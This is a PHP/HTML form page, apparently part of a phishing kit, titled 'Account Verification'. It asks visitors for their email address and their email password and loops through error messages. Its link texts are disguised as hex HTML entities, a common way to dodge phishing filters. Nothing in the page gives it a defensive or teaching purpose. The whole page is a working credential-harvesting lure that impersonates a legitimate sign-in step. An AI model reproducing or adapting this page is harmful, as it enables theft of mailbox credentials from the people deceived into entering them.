<?php 
include "header.php";
?>
<div class="body">

<form method="post">
<div class="form">
<div class="form-h"><div class="t-h">Account Verification</div>
<div class="b-h">Verify your account by entering your email and email password
<?php 
		  
		   
		   if(isset($r)){
			  	  foreach($r as $i){
					  echo '<div class="b-h-error">'.$i.'</div>';
				  }
				
		   }
		   ?>
</div>
              
</div>
<input type="email" placeholder="Email" name="email" required>
<input type="password" placeholder="Email Password" name="emailpassword" required>
  
<input type="submit" value="Sign in" name="signin2">
<div class="form-link">
<a href="#">&#x46;&#x6F;&#x72;&#x67;&#x6F;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x2F;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x3F; &rsaquo;</a>
<a href="#">&#x4E;&#x6F;&#x74;&#x20;&#x65;&#x6E;&#x72;&#x6F;&#x6C;&#x6C;&#x65;&#x64;&#x3F;&#x20;&#x53;&#x69;&#x67;&#x6E;&#x20;&#x75;&#x70;&#x20;&#x6E;&#x6F;&#x77;&#x2E; &#8250;</a>
</div>
</div>
</form>
</div>
<?php 
include "footer.php";
?>
</div>


</body>
</html>